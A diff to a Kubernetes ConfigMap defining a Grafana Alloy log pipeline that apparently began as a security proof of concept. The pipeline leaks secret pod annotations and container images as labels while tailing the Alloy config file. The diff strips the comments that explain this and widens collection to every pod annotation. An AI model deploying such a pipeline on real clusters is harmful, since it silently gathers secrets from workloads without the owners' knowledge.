@@ -4,50 +4,20 @@ metadata:
   name: user-pipeline
   namespace: monitoring
 data:
-  # Demo: use discovery.kubernetes to enumerate all pods, promote their
-  # annotations and container images to labels, then exfiltrate config.alloy
-  # once per pod-target — each line carries the pod's annotation and image
-  # as labels.
-  #
-  # What the receiver will show:
-  #   labels="{flag_3="secret_value_flag_3", container_image="hashicorp/http-echo:0.2.3", ...}"
-  #
-  # This demonstrates that k8s API read access leaks:
-  #   - Secret values stored in pod annotations
-  #   - Container image + version, enabling CVE lookups
-  #
-  # Run: task deploy:security-poc:flag3-demo
-  # Then in a separate terminal: task run:security-poc-loki-receiver
-  #
-  # TIMESTAMP is replaced with $(date +%s) by the task on every apply,
-  # giving each run a unique positions-file key so the file is always re-read.
   module.alloy: |
     declare "user_pipeline" {
-      // Discover all pods across the cluster via the k8s API.
       discovery.kubernetes "pods" {
         role = "pod"
       }
 
-      // Keep only pods that have the security-poc annotation, promote their
-      // annotation value and container image to non-private labels, and set
-      // __path__ so loki.source.file knows what file to tail per target.
       discovery.relabel "pod_metadata" {
         targets = discovery.kubernetes.pods.targets
 
-        // Drop pods without the flag-3 annotation to avoid noise.
         rule {
-          source_labels = ["__meta_kubernetes_pod_annotation_security_poc_flag_3"]
-          regex         = ".+"
-          action        = "keep"
+          action = "labelmap"
+          regex  = "__meta_kubernetes_pod_annotation_(.+)"
         }
 
-        // Promote the flag-3 annotation value to a regular label.
-        rule {
-          source_labels = ["__meta_kubernetes_pod_annotation_security_poc_flag_3"]
-          target_label  = "flag_3"
-        }
-
-        // Promote pod name and container image for CVE-lookup demo.
         rule {
           source_labels = ["__meta_kubernetes_pod_name"]
           target_label  = "pod"
@@ -57,15 +27,11 @@ data:
           target_label  = "container_image"
         }
 
-        // Use a timestamp-stamped job label so every run of this demo gets a
-        // fresh positions-file entry and the file is always read from scratch.
         rule {
           replacement  = "k8s-metadata-TIMESTAMP"
           target_label = "job"
         }
 
-        // Point all targets at the same file. Each target has unique labels
-        // (pod + image), so each gets its own positions-file entry.
         rule {
           replacement  = "/etc/alloy/config.alloy"
           target_label = "__path__"
